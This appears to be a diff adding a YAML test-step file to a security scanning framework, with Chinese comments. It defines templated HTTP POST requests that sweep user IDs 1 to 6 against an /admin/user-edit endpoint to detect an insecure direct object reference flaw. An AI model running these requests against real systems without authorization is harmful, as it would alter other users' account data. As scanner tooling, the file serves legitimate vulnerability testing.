@@ -1,0 +1,68 @@
+# 可执行阶梯 —— idor（登录用户可改任意 uid 的资料，缺所有权检查）
+#
+# 依据：plugins/idor/plugin.yaml（POST /admin/user-edit；marker 为被改用户的 JSON 确认
+# `"updated":"bob"` / `"updated":"admin"`），字段名由 profile surface 提供（{{UID_PARAM}}/{{SIG_FIELD}}）。
+# 阶梯的价值：**uid 扫描**——从 1 到 6 逐个试，命中的那一步告诉我们"越权改到了谁"。
+class: idor
+display: 越权修改他人资料（无所有权检查）
+
+baseline:
+  param_value: "1"
+
+steps:
+  - id: uid_own_control
+    kind: request
+    value: |
+      POST {{TARGET}}/admin/user-edit HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{UID_PARAM}}=1&{{SIG_FIELD}}=LADDER_OWN
+    note: 对照组：改自己（uid=1）应成功 ⇒ 证明请求形状本身是对的
+
+  - id: uid_sweep_2
+    kind: request
+    value: |
+      POST {{TARGET}}/admin/user-edit HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{UID_PARAM}}=2&{{SIG_FIELD}}=LADDER_U2
+    note: 越权改 uid=2
+
+  - id: uid_sweep_3
+    kind: request
+    value: |
+      POST {{TARGET}}/admin/user-edit HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{UID_PARAM}}=3&{{SIG_FIELD}}=LADDER_U3
+    note: 越权改 uid=3（库内载荷里的 bob 就在这里）
+
+  - id: uid_sweep_4
+    kind: request
+    value: |
+      POST {{TARGET}}/admin/user-edit HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{UID_PARAM}}=4&{{SIG_FIELD}}=LADDER_U4
+
+  - id: uid_sweep_5
+    kind: request
+    value: |
+      POST {{TARGET}}/admin/user-edit HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{UID_PARAM}}=5&{{SIG_FIELD}}=LADDER_U5
+
+  - id: uid_sweep_6
+    kind: request
+    value: |
+      POST {{TARGET}}/admin/user-edit HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{UID_PARAM}}=6&{{SIG_FIELD}}=LADDER_U6
